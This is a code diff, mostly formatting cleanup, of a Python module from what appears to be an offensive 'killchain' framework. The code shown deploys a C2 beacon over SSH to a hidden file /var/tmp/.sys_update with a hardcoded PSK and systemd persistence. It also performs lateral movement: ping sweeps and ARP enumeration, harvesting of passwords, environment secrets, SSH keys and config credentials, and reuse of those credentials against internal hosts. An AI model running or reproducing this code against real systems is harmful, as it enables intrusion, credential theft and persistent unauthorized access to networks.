@@ -17,8 +17,13 @@ try:
     from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
-    def find_wordlist(cat): return ""
-    def find_all_wordlists(cat): return []
+
+    def find_wordlist(cat):
+        return ""
+
+    def find_all_wordlists(cat):
+        return []
+
 
 from typing import Optional
 
@@ -26,14 +31,14 @@ from core.execution.policy import normalize_host
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
-C_GREEN  = "\033[92m"
+C_GREEN = "\033[92m"
 C_YELLOW = "\033[93m"
-C_RED    = "\033[91m"
-C_CYAN   = "\033[96m"
-C_GREY   = "\033[90m"
-C_BLUE   = "\033[94m"
+C_RED = "\033[91m"
+C_CYAN = "\033[96m"
+C_GREY = "\033[90m"
+C_BLUE = "\033[94m"
 C_MAGENTA = "\033[95m"
-C_RESET  = "\033[0m"
+C_RESET = "\033[0m"
 
 
 # PARAMIKO SSH HELPERS (shared across stages)
@@ -52,6 +57,7 @@ def _get_our_ip() -> str:
 
 
 # C2 BEACON DEPLOYMENT
+
 
 def deploy_c2_beacon(
     host: str,
@@ -99,18 +105,19 @@ def deploy_c2_beacon(
         )
         # Use the hardcoded campaign PSK for now
         psk = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
-        agent_code = agent_code.replace('psk: str,', f'psk: str = "{psk}",')
-        
+        agent_code = agent_code.replace("psk: str,", f'psk: str = "{psk}",')
+
         # Upload via base64
         import base64
+
         encoded = base64.b64encode(agent_code.encode("utf-8")).decode("utf-8")
-        
+
         target_path = "/var/tmp/.sys_update"
         print(f"    {C_CYAN}[*] Uploading beacon payload to {target_path}...{C_RESET}")
-        
+
         _ssh_exec(client, f"echo '{encoded}' | base64 -d > {target_path}", timeout=10)
         _ssh_exec(client, f"chmod +x {target_path}", timeout=5)
-        
+
         # Verify upload
         check = _ssh_exec(client, f"ls -la {target_path}", timeout=5)
         if ".sys_update" in check:
@@ -136,12 +143,16 @@ def deploy_c2_beacon(
                     payload_path=f"python3 {target_path}",
                     timeout=30,
                 )
-                res_success = getattr(res, "success", False) or (isinstance(res, dict) and res.get("status") == "success")
+                res_success = getattr(res, "success", False) or (
+                    isinstance(res, dict) and res.get("status") == "success"
+                )
                 res_data = getattr(res, "data", None) or (res.get("data", {}) if isinstance(res, dict) else {})
                 res_error = getattr(res, "error", "") or (res.get("error", "") if isinstance(res, dict) else "")
-                
+
                 if res_success:
-                    output += f"[+] C2 beacon persistence established via systemd ({res_data.get('service', 'systemd')})\n"
+                    output += (
+                        f"[+] C2 beacon persistence established via systemd ({res_data.get('service', 'systemd')})\n"
+                    )
                     print(f"    {C_GREEN}[+] Systemd persistence established{C_RESET}")
                 else:
                     output += f"[-] Failed to establish systemd persistence: {res_error}\n"
@@ -161,7 +172,7 @@ def deploy_c2_beacon(
 
     except Exception as e:
         output += f"[-] Beacon deployment failed: {e!s}\n"
-        
+
     finally:
         client.close()
 
@@ -170,8 +181,8 @@ def deploy_c2_beacon(
 
 # STAGE 5: LATERAL MOVEMENT (paramiko-based)
 
-def lateral_move(host: str, user: str, password: str, port: int = 22,
-                 extra_creds: Optional[list] = None) -> str:
+
+def lateral_move(host: str, user: str, password: str, port: int = 22, extra_creds: Optional[list] = None) -> str:
     """
     Lateral movement via paramiko.
     1. SSH into compromised host
@@ -198,29 +209,33 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
 
         # ARP table
         arp = _ssh_exec(client, "arp -an 2>/dev/null || ip neigh 2>/dev/null", timeout=10)
-        for match in re.finditer(r'(\d+\.\d+\.\d+\.\d+)', arp):
+        for match in re.finditer(r"(\d+\.\d+\.\d+\.\d+)", arp):
             ip = match.group(1)
             if ip not in ("0.0.0.0", "255.255.255.255", "127.0.0.1", host):
                 discovered_hosts.add(ip)
 
         # /etc/hosts
         hosts_file = _ssh_exec(client, "cat /etc/hosts 2>/dev/null", timeout=5)
-        for match in re.finditer(r'^(\d+\.\d+\.\d+\.\d+)\s', hosts_file, re.MULTILINE):
+        for match in re.finditer(r"^(\d+\.\d+\.\d+\.\d+)\s", hosts_file, re.MULTILINE):
             ip = match.group(1)
             if ip not in ("0.0.0.0", "127.0.0.1", "127.0.1.1", host):
                 discovered_hosts.add(ip)
 
         # Subnet scan via ping sweep (fast)
-        our_subnet = _ssh_exec(client, "ip -4 addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}'", timeout=5)
+        our_subnet = _ssh_exec(
+            client, "ip -4 addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}'", timeout=5
+        )
         subnet_cidr = our_subnet.strip().split("\n")[0] if our_subnet else ""
         if subnet_cidr:
             output += f"Internal subnet: {subnet_cidr}\n"
             # Quick ping sweep
             base = ".".join(subnet_cidr.split(".")[:3])
-            ping_result = _ssh_exec(client,
+            ping_result = _ssh_exec(
+                client,
                 f"for i in $(seq 1 254); do (ping -c1 -W1 {base}.$i | grep 'from' &); done 2>/dev/null | sort",
-                timeout=30)
-            for match in re.finditer(r'from (\d+\.\d+\.\d+\.\d+)', ping_result):
+                timeout=30,
+            )
+            for match in re.finditer(r"from (\d+\.\d+\.\d+\.\d+)", ping_result):
                 ip = match.group(1)
                 if ip != host:
                     discovered_hosts.add(ip)
@@ -241,8 +256,14 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
             ("MySQL configs", "grep -rs 'password' /etc/mysql/ /etc/my.cnf 2>/dev/null | head -10"),
             ("PHP configs", "grep -rs 'password\\|passwd' /var/www/ /opt/ 2>/dev/null | grep -v '.js' | head -15"),
             ("SSH private keys", "find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -5"),
-            ("History files", "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'password|ssh|mysql|pass=' | head -20"),
-            ("Environment vars", "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token' | head -15"),
+            (
+                "History files",
+                "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'password|ssh|mysql|pass=' | head -20",
+            ),
+            (
+                "Environment vars",
+                "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|secret|key|token' | head -15",
+            ),
             (".env files", "find / -name '.env' -o -name 'env.local' 2>/dev/null | head -5"),
             ("wp-config.php", "cat /var/www/*/wp-config.php 2>/dev/null | grep -E 'DB_|define'"),
             ("Netrc files", "cat /root/.netrc /home/*/.netrc 2>/dev/null"),
@@ -254,7 +275,9 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
             if result and "[!]" not in result and "No such file" not in result:
                 output += f"\n[{label}]\n{result[:1000]}\n"
                 # Extract passwords from results
-                for match in re.finditer(r"(?:password|passwd|pass|secret)\s*[=:]\s*['\"]?(\S+?)['\"]?\s", result, re.IGNORECASE):
+                for match in re.finditer(
+                    r"(?:password|passwd|pass|secret)\s*[=:]\s*['\"]?(\S+?)['\"]?\s", result, re.IGNORECASE
+                ):
                     pwd = match.group(1)
                     if len(pwd) > 2 and len(pwd) < 100 and pwd not in ("", "*", "x", "!"):
                         discovered_creds.append({"user": "root", "password": pwd})
@@ -288,13 +311,17 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
 
         # ── PHASE 3: Try credentials against discovered hosts ────
         if discovered_hosts and discovered_creds:
-            print(f"    {C_CYAN}[*] Phase 3: Trying credentials against {len(discovered_hosts)} internal hosts...{C_RESET}")
+            print(
+                f"    {C_CYAN}[*] Phase 3: Trying credentials against {len(discovered_hosts)} internal hosts...{C_RESET}"
+            )
 
             for target_ip in sorted(discovered_hosts):
                 # Check if SSH is open on internal host (from compromised host)
-                ssh_check = _ssh_exec(client,
+                ssh_check = _ssh_exec(
+                    client,
                     f"timeout 3 bash -c 'echo > /dev/tcp/{target_ip}/22' 2>/dev/null && echo OPEN || echo CLOSED",
-                    timeout=5)
+                    timeout=5,
+                )
 
                 if "OPEN" not in ssh_check:
                     output += f"\n  [{target_ip}] SSH port closed, skipping\n"
@@ -306,18 +333,18 @@ def lateral_move(host: str, user: str, password: str, port: int = 22,
                     try:
                         # Use paramiko through the pivot
                         # First try direct connection from our machine
-                        pivot_client, _pivot_err = _ssh_connect(
-                            target_ip, cred["user"], cred["password"], timeout=8
-                        )
+                        pivot_client, _pivot_err = _ssh_connect(target_ip, cred["user"], cred["password"], timeout=8)
                         if pivot_client:
                             pivot_whoami = _ssh_exec(pivot_client, "id; hostname")
                             pivot_client.close()
-                            compromised_hosts.append({
-                                "host": target_ip,
-                                "user": cred["user"],
-                                "password": cred["password"],
-                                "whoami": pivot_whoami
-                            })
+                            compromised_hosts.append(
+                                {
+                                    "host": target_ip,
+                                    "user": cred["user"],
+                                    "password": cred["password"],
+                                    "whoami": pivot_whoami,
+                                }
+                            )
                             output += f"    [+] LATERAL MOVEMENT SUCCESS: {cred['user']}@{target_ip}\n"
                             output += f"        {pivot_whoami}\n"
                             print(f"    {C_GREEN}[+] COMPROMISED: {cred['user']}@{target_ip}{C_RESET}")
